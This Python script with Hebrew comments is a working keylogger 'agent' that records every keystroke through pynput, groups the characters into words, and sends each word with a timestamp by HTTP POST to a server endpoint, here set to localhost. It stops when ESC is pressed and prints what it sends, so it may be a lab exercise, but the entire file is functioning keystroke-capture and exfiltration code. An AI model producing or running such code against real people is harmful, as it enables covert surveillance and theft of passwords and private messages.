from pynput import keyboard
import requests
import datetime
import json
# --- הגדרות ---
# משתנה גלובלי שישמש כמחסן (Buffer) לתווים שנאספו
word_buffer = ""
# הכתובת המדויקת של ה-Endpoint בשרת שלנו (FastAPI)
SERVER_URL = "http://localhost:8000/api/v1/keystrokes" 
def send_data(captured_word):
    """
    פונקציה זו אורזת את המילה ומבצעת בקשת HTTP POST לשרת.
    """
    
    # 1. אריזת הנתונים לפורמט JSON עם חותמת זמן עדכנית
    payload = {
        "timestamp": datetime.datetime.now().isoformat(),
        "key": captured_word
    }
    
    # הדפסה בטרמינל של הסוכן כדי לדעת מה נשלח
    print(f"\n[AGENT] Sending data: {captured_word}")
    
    try:
        # 2. שליחת הבקשה לשרת (HTTP POST). json=payload מכין את הנתונים נכון.
        response = requests.post(SERVER_URL, json=payload, timeout=5)
        
        # 3. בדיקת תגובת השרת
        if response.status_code == 200:
            print(f"[AGENT] SUCCESS: Server responded with: {response.json()}")
        else:
            print(f"[AGENT] ERROR: Server responded with status {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print("[AGENT] CRITICAL ERROR: Could not connect to the server. Check if main.py is running!")
    except Exception as e:
        print(f"[AGENT] An unexpected error occurred during send: {e}")

def on_release(key):
    global word_buffer
    
    # --------------------------------------------------
    # יציאה מהתוכנית בלחיצה על ESC
    # --------------------------------------------------
    if key == keyboard.Key.esc:
        print("\n--- Stopping listener (ESC pressed) ---")
        word_buffer = ""
        return False
    
    # --------------------------------------------------
    # מקשי טריגר: Space או Enter
    # --------------------------------------------------
    if key in (keyboard.Key.space, keyboard.Key.enter):
        if word_buffer:
            # 💡 השינוי העיקרי: קוראים לפונקציית השליחה במקום הדפסה
            send_data(word_buffer) 
            word_buffer = "" # איפוס
        return
        
    # --------------------------------------------------
    # הוספת תווים רגילים
    # --------------------------------------------------
    try:
        if key.char:
            word_buffer += key.char
    except AttributeError:
        # מתעלמים ממקשים מיוחדים
        pass
print("Listener started. Press ESC to exit.\n")
# שימו לב: מומלץ להוריד את suppress=True לבדיקות, כדי לראות את הקלט
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()